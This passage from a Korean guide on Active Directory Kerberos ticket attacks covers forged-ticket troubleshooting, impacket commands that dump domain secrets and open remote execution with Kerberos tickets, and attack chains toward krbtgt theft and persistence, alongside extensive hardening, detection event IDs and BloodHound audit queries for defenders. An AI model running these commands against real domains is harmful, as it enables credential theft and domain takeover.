| Hyper-V/VM 시계 동기화가 기본 켜져있어 DC 차이 왜곡 | VM Guest 시간 서비스 | 공격 호스트 VM의 Integration Services 시간 동기화 끄기 |
| Silver Ticket이 시간은 맞는데 거부 | 티켓 `authtime`/`starttime`이 **미래** | ticketer `-start-time` 옵션 또는 생성 직후 즉시 사용 |

### 6.4 NTLM 비활성 환경에서 Kerberos만으로 진행

조직이 `Restrict NTLM: Deny all` 를 적용한 환경에서는 `impacket-*` 도구가
기본 흐름(NTLM)으로 실패합니다. 모두 **`-k -no-pass` + `KRB5CCNAME`**
조합으로 Kerberos만 쓸 수 있도록 바꾸세요.

```bash
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass -dc-ip 10.0.0.10 \
  'corp.local/administrator@dc01.corp.local'
impacket-wmiexec -k -no-pass 'corp.local/administrator@target.corp.local'
impacket-psexec -k -no-pass 'corp.local/administrator@target.corp.local'
impacket-smbclient -k -no-pass 'corp.local/administrator@target.corp.local'
```

추가 유의 사항:

- **대상 호스트는 FQDN**으로 지정해야 Kerberos SPN이 해석됩니다 (IP는 실패).
- `/etc/krb5.conf` 에 `[realms]` 과 `default_realm = CORP.LOCAL` 지정.
- `/etc/hosts` 에 **DC FQDN과 대상 FQDN** 모두 등록.
- `-dc-host` 와 `-dc-ip` 를 명시적으로 지정하는 것이 안전.

- 출처: [impacket README (ticketConverter, getST, etc.)](https://github.com/fortra/impacket), [Rubeus README](https://github.com/GhostPack/Rubeus), [Microsoft — Restrict NTLM 설정](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain)

---

## 7. 자주 나는 오류 표 (Kerberos 전반)

| 증상 | 원인 | 대응 |
|---|---|---|
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | 사용자명 오타, UPN 대소문자, 도메인 틀림 | `UPPERCASE@CORP.LOCAL`로 재시도, sAMAccountName 확인 |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | SPN 존재하지 않음 | `setspn -L <svc-account>` / BloodHound로 SPN 확인 |
| `KDC_ERR_PREAUTH_FAILED` | 비밀번호/해시 틀림, 또는 암호화 타입 불일치 | AES 전용 환경에서 RC4 해시 쓰면 실패 — AES 키로 재시도 |
| `KDC_ERR_BADOPTION` | 요청 플래그가 정책 금지(forwardable 등) | Protected Users 그룹인지 확인, S4U 요청의 `forwardable` 비트 조정 |
| `KRB_AP_ERR_SKEW` | 시계 차이 > 5분 | §6.3 참고 |
| `KRB_AP_ERR_MODIFIED` | 서비스 키 불일치(Silver Ticket 키 오류) | 서비스 계정 NT/AES 재확인, 스테일 해시 아닌지 |
| `KRB_AP_ERR_BAD_INTEGRITY` | PAC 서명 불일치 — Diamond 변조 실패 | krbtgt 키 신선도 확인, N-1 키 사용 중일 수 있음 |
| S4U2Proxy `KDC_ERR_POLICY` | `AllowedToDelegateTo` 리스트에 대상 SPN 없음 | `altservice` 로 재작성 또는 추가 위임 설정 ACE 확인 |
| `S4U2Self` 티켓은 받았는데 `forwardable=false` | 대상 계정이 **Account is sensitive and cannot be delegated**(0x100000) 또는 Protected Users | 다른 대상 선택 |
| `klist`에 티켓은 있는데 SMB 거부 | `KRB5CCNAME` 미설정 또는 Windows LSA에 티켓 미주입 | Rubeus는 `/ptt`, impacket은 `export KRB5CCNAME=...` |

---

## 8. 방어 요약 — 정책·계정·탐지 3층

### 8.1 krbtgt 운영

| 조치 | 방법 |
|---|---|
| **2회(24h+ 간격) 리셋** | Microsoft [New-KrbtgtKeys.ps1](https://github.com/microsoft/New-KrbtgtKeys.ps1) 스크립트 |
| **수명 모니터링** | `Get-ADUser krbtgt -Properties PasswordLastSet` 180일 임계 |
| **백업 시 암호화** | DC NTDS.dit 백업 테이프/오브젝트 스토리지 암호화 + 접근 감사 |
| **RODC krbtgt 별도 관리** | RODC는 krbtgt_XXXXX 별도 계정 — 침해 시 영향 범위 축소 |

### 8.2 머신 계정 생성

```powershell
# 도메인 전역 MAQ 를 0으로
Set-ADDomain -Identity corp.local -Replace @{"ms-DS-MachineAccountQuota"=0}

# 가입 자동화에만 Create Computer Objects ACE 위임 (별도 OU)
```

### 8.3 Protected Users / Authentication Policy Silo

- **Protected Users** 그룹 (2012R2+): NTLM/Digest/CredSSP 금지, RC4 금지,
  TGT 수명 4시간 비연장. **Tier-0 전원 등록**.
- **Authentication Policy & Silo**: 특정 계정이 특정 머신에서만 인증
  가능하게 제한. 고위험 계정(DA, EA, krbtgt 관리자)에 적용.

### 8.4 AES-only

```powershell
# 각 사용자/서비스 계정에 AES만 허용 (0x18 = AES128+AES256)
Get-ADUser <svc> -Properties msDS-SupportedEncryptionTypes
Set-ADAccountControl -Identity <svc> # ...
Set-ADUser <svc> -Replace @{"msDS-SupportedEncryptionTypes"=0x18}

# DC가 RC4 요청을 거부하도록
# GPO: Computer Configuration > Policies > Windows Settings > Security
# Settings > Local Policies > Security Options
# "Network security: Configure encryption types allowed for Kerberos"
# -> AES128, AES256, Future encryption types
```

### 8.5 위임 ACE 상시 감사

| 속성 | 뜻 | 감사 쿼리 |
|---|---|---|
| `TRUSTED_FOR_DELEGATION` | Unconstrained | `Get-ADComputer -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'` |
| `TRUSTED_TO_AUTH_FOR_DELEGATION` | Protocol Transition | `(userAccountControl:...:=16777216)` |
| `msDS-AllowedToDelegateTo` | Constrained 대상 리스트 | 비어있지 않은 계정 전수 검토 |
| `msDS-AllowedToActOnBehalfOfOtherIdentity` | RBCD | 모든 머신 객체 검토 — 누가 쓸 수 있는지(ACE 체인) 확인 |

### 8.6 S4U 로깅

- Event 4769 의 **`Transited Services`** 필드가 **비어있지 않다**는 것은
  S4U2Proxy 흐름이 일어났다는 뜻 — 정상 서비스 외 호출자 감시.
- Event 4769 의 **`Service Name`** 이 평소 접근하지 않던 서비스로 급증하면
  S4U 체인 의심.
- 머신 계정이 **다른 머신 계정으로 가장** 요청하는 4624 Logon Type 3 상관.

- 출처: [Microsoft — Protected Users 그룹](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group), [Microsoft — Authentication Policies and Silos](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/authentication-policies-and-authentication-policy-silos), [Microsoft — Configuring Kerberos Encryption Types](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/kerberos-encryption-type)

---

## 9. 탐지 — 로그 ID·BloodHound Cypher

### 9.1 Event ID 요약

| Event ID | 소스 | 의미 |
|---|---|---|
| **4768** | Security (DC) | AS-REQ (TGT 발급). `Certificate Information` 가 비어있지 않으면 PKINIT |
| **4769** | Security (DC) | TGS 발급. `Ticket Encryption Type`, `Service Name`, `Transited Services` 핵심 |
| **4770** | Security (DC) | TGT 갱신(Renew). 비정상적 재갱신 패턴이 Golden Ticket 신호 |
| **4624** | Security (모든 호스트) | 로그온 성공. `Logon Type` 과 `Authentication Package` 로 Kerberos/NTLM 식별 |
| **4625** | Security | 로그온 실패 — 비밀번호 뿌리기 탐지 |
| **5140 / 5145** | Security | 파일 공유 접근 — Silver Ticket 후 SMB 접근 추적 |
| **4648** | Security | **다른 자격증명으로 로그온 시도** — Rubeus `ptt` 후 `runas` 패턴 탐지 |
| **4672** | Security | 특권 로그온 — Golden Ticket으로 "admin equivalent" |

### 9.2 Event 4769 — 비정상 암호화 타입

| 암호화 타입 코드 | 의미 | 탐지 요점 |
|---|---|---|
| `0x1` / `0x3` | DES | 현대 환경에서 거의 없음 — 극단적 레거시 |
| `0x11` | AES128 | 정상 |
| `0x12` | AES256 | 정상 |
| **`0x17`** | **RC4-HMAC** | AES-only 환경에서 RC4 요청은 **Kerberoasting/Silver Ticket 강한 신호** |
| `0x18` | RC4-HMAC-EXP | 매우 드묾 |

### 9.3 4770 — 갱신

TGT Renew는 정상적으로도 발생하지만, **같은 PAC을 가진 TGT가 비정상적으로
오래(기본 7일 초과) 유지**되거나 **공격자가 TGT 수명을 길게 지정**한 경우
반복적인 renew가 보입니다.

### 9.4 4624 Logon Type 상관

| Logon Type | 의미 | 공격 신호 |
|---|---|---|
| 2 | 대화형 | Golden Ticket으로 DA 대화형? 드물다 |
| 3 | 네트워크 | PsExec/WMI/SMB — Pass-the-Ticket 후 가장 흔함 |
| 4 | 배치 | 예약 작업 — GPO 남용 체인 |
| 10 | RDP (RemoteInteractive) | Kerberos 티켓 가장 로그인 |

### 9.5 BloodHound Cypher 예시

```cypher
// Unconstrained Delegation 보유 노드
MATCH (c:Computer {unconstraineddelegation: true})
RETURN c.name, c.operatingsystem ORDER BY c.name

// Constrained Delegation 대상이 있는 노드
MATCH (c)
WHERE c.allowedtodelegate IS NOT NULL AND size(c.allowedtodelegate) > 0
RETURN c.name, c.allowedtodelegate

// RBCD edge (BloodHound v4+)
MATCH p=(a)-[:AllowedToAct]->(b:Computer)
RETURN p LIMIT 25

// SPN이 걸린 사용자 (Kerberoastable)
MATCH (u:User {hasspn: true})
WHERE u.enabled = true
RETURN u.name, u.serviceprincipalnames
```

### 9.6 krbtgt 사용 이상

```cypher
// krbtgt 계정 자체의 lastlogon 체크 (정상적으로는 krbtgt는 로그온 안 함)
MATCH (u:User {name: "KRBTGT@CORP.LOCAL"})
RETURN u.lastlogon, u.lastlogontimestamp, u.pwdlastset
```

Event 4769의 `Service Name = krbtgt` 는 정상 흐름에서도 발생하지만
**짧은 시간에 수백 건이 쌓이면** Golden/Diamond Ticket 재사용 신호입니다.
Microsoft Defender for Identity는 이 패턴을 "Suspected Golden Ticket"으로
알립니다.

- 출처: [Microsoft — Kerberos Protocol Events](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-kerberos-service-ticket-operations), [SpecterOps — BloodHound CE](https://support.bloodhoundenterprise.io/), [Microsoft Defender for Identity — Alerts](https://learn.microsoft.com/en-us/defender-for-identity/alerts-overview)

---

## 10. 실습 환경 (공개 랩)

| 환경 | 다루는 기법 | 공식 문서 |
|---|---|---|
| [GOAD — North.sevenkingdoms / Essos 시나리오](https://github.com/Orange-Cyberdefense/GOAD) | Kerberoast, Unconstrained·Constrained·RBCD, Trust Abuse | GOAD README |
| [GOAD-Light](https://github.com/Orange-Cyberdefense/GOAD) | Kerberoast + Constrained 체인 | 상동 |
| [HTB — Scrambled (은퇴)](https://www.hackthebox.com/machines/Scrambled) | NTLM 비활성 환경, Silver Ticket (MSSQL) | HTB 공식 Writeups |
| [HTB — Intelligence (은퇴)](https://www.hackthebox.com/machines/Intelligence) | gMSA 비밀번호 추출(`msDS-ManagedPassword`), RBCD | 상동 |
| [HTB — Timelapse (은퇴)](https://www.hackthebox.com/machines/Timelapse) | LAPS 비밀번호 획득 후 PowerShell 세션 | 상동 |
| [HTB — Outdated (은퇴)](https://www.hackthebox.com/machines/Outdated) | Shadow Credentials + Follina 엮기 | 상동 |
| [HTB — Multimaster (은퇴)](https://www.hackthebox.com/machines/Multimaster) | SQL + Kerberoast + AS-REP | 상동 |
| [HTB — Blackfield (은퇴)](https://www.hackthebox.com/machines/Blackfield) | AS-REP Roast + LAPS + DCSync (Kerberos 전환) | 상동 |

Silver/Golden Ticket을 실습할 때는 **발급한 모든 티켓의 PAC 내용(RID,
그룹)과 생애주기**를 기록하고, 종료 전에 임시 `KRB5CCNAME`을 정리합니다.
운영 환경이었다면 **발급된 티켓이 생애주기 내 유효하다는 점을 복구
계획에 반드시 포함**하세요.

---

## 11. 다음 단계로 이어지는 공격

- **DC 장악까지**: Silver Ticket (`cifs/dc01`) 혹은 RBCD + S4U로 DC 머신
  계정 접근 → `secretsdump -just-dc` 로 **krbtgt NT/AES 획득** → Golden
  Ticket으로 영구 지속성. krbtgt 2회 리셋이 없으면 N-1 키가 남아 **리셋
  후에도 공격자 티켓 유효**합니다.
- **AD CS로 재진입**: krbtgt를 쥐지 못했더라도 머신 계정 가장으로
  [[AD 심화 — AD CS 인증서 공격 전수 정리|AD CS ESC1/ESC8]] 경로를 통해
  DC 머신 인증서를 받아 **UnPAC-the-hash로 krbtgt 또는 다른 핵심 계정 해시
  유출**이 가능합니다. 이렇게 하면 "Golden Ticket을 PKI 경로로 돌려받는"
  셈이 됩니다.
- **릴레이와의 교차**: [[AD 심화 — 강제 인증과 릴레이의 이해와 방어|강제
  인증·릴레이]]에서 본 PetitPotam → ntlmrelayx `--adcs` → PKINIT →
  UnPAC-the-hash 는 **Kerberos 체인의 "자격증명 공급원"** 역할을 합니다.
  두 글을 함께 보면, 공격자는 **"먼저 자격증명(해시/키)을 수집하고 → 티켓
  위조/위임으로 영향 범위를 확대"** 하는 2단 구조로 움직입니다.
- **지속성(Persistence)**: Golden Ticket · Shadow Credentials ·
  AdminSDHolder ACL 추가 · 서비스 계정 Silver Ticket 반복 발급은 각각
  **다른 발견 지점**을 가지므로, 여러 지속성을 겹쳐 배치하는 것이 레드팀
  관행입니다. 방어 측은 krbtgt 리셋만으로 모든 경로가 끊기지 **않는다**는
  점을 염두에 두세요.
- **ACL 체인**: 위임 설정 자체를 **ACE로 획득**하는 체인은
  [[AD 심화 — ACL 권한 체인과 DCSync 완성|ACL 권한 체인과 DCSync]] 에서
  이어집니다. BloodHound의 `AddAllowedToAct`, `WriteSPN`,
  `AddKeyCredentialLink` 엣지가 바로 이 글의 공격 전제조건입니다.

---

- 출처 모음: [harmj0y — The Delegation Explosion](https://posts.specterops.io/s4u2pwnage-5547921c0196), [Elad Shamir — Wagging the Dog](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html), [GhostPack/Rubeus README](https://github.com/GhostPack/Rubeus), [fortra/impacket README](https://github.com/fortra/impacket), [SpecterOps — Kerberos & Ticket 공격 블로그](https://posts.specterops.io/), [Microsoft — Protected Users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group), [Microsoft — KRBTGT 리셋](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/ad-forest-recovery-reset-krbtgt), [Microsoft — Kerberos Encryption Types](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/kerberos-encryption-type), [Charlie Clark — Diamond & Sapphire](https://www.semperis.com/blog/a-diamond-and-a-sapphire/), [Sean Metcalf — Golden Ticket](https://adsecurity.org/?p=1640), [Orange Cyberdefense GOAD](https://github.com/Orange-Cyberdefense/GOAD)
